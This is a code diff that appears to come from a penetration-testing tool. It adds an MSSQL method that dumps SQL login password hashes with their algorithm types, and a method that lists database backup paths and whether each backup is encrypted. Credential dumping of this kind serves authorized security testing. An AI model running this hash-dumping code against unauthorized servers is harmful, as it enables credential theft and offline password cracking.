@@ -671,3 +671,78 @@ class mssql(connection):
 
         self._dpapi_triage = DPAPITriage(self, target)
         return self._dpapi_triage
+
+    @requires_admin
+    def db_hash(self):
+        self.logger.display("Dumping local database users' hashes")
+        query = """
+        SELECT
+            sp.name,
+            CASE
+                WHEN SUBSTRING(sl.password_hash, 1, 2) = 0x0200 THEN 'SHA-512'
+                WHEN SUBSTRING(sl.password_hash, 1, 2) = 0x0300 THEN 'PBKDF2'
+                WHEN SUBSTRING(sl.password_hash, 1, 2) = 0x0100 THEN 'SHA-1'
+                ELSE 'Unknown'
+            END AS hash_type,
+            sl.password_hash
+        FROM sys.server_principals sp
+        INNER JOIN sys.sql_logins sl
+            ON sp.principal_id = sl.principal_id
+        WHERE sp.type = 'S'           -- uniquement les logins SQL
+        AND sp.name NOT LIKE '##%'
+        ORDER BY sp.name;
+        """
+        rows = self.conn.sql_query(query)
+        if self.conn.lastError:
+            self.logger.fail(f"Error running the SQL query: {self.conn.lastError}")
+            return
+        if not rows:
+            self.logger.fail("No logins returned")
+            return
+        else:
+            self.logger.display("Enumerated logins")
+            self.logger.highlight(f"{'Login Name':<15} {'Hash type':<10} {'Hash'}")
+            self.logger.highlight(f"{'----------':<15} {'----------':<10} {'--------------':}")
+            for row in rows:
+                name = row.get("name")
+                hash_type = row.get("hash_type")
+                password_hash = row.get("password_hash")
+                if password_hash != "NULL":
+                    self.logger.highlight(f"{name:<15} {hash_type:<10} {password_hash:<140}")
+
+    def list_backups(self):
+        self.logger.info("Dumping database backups")
+        query = """
+        SELECT
+            bs.database_name,
+            bs.server_name,
+            bmf.physical_device_name AS backup_file_path,
+            CASE
+                WHEN bs.encryptor_type IS NULL THEN 'Unencrypted'
+                ELSE 'Encrypted'
+            END AS backup_encryption_status,
+            bs.encryptor_type,
+            bs.key_algorithm
+        FROM msdb.dbo.backupset AS bs
+        INNER JOIN msdb.dbo.backupmediafamily AS bmf
+            ON bs.media_set_id = bmf.media_set_id
+        INNER JOIN sys.databases AS d
+            ON bs.database_name = d.name
+        ORDER BY bs.backup_finish_date DESC;
+        """
+        rows = self.conn.sql_query(query)
+        if self.conn.lastError:
+            self.logger.fail(f"Error running the SQL query: {self.conn.lastError}")
+            return
+        if not rows:
+            self.logger.fail("No backups returned")
+            return
+        else:
+            self.logger.display("Enumerated backups")
+            self.logger.highlight(f"{'Backup Name':<20} {'Encryption':<15} {'Backup Path'}")
+            self.logger.highlight(f"{'-----------':<20} {'----------':<15} {'-----------'}")
+            for row in rows:
+                database_name = row.get("database_name").strip()
+                is_encrypted = row.get("backup_encryption_status").strip()
+                backup_file_path = row.get("backup_file_path").strip()
+                self.logger.highlight(f"{database_name:<20} {is_encrypted:<15s} {backup_file_path}")
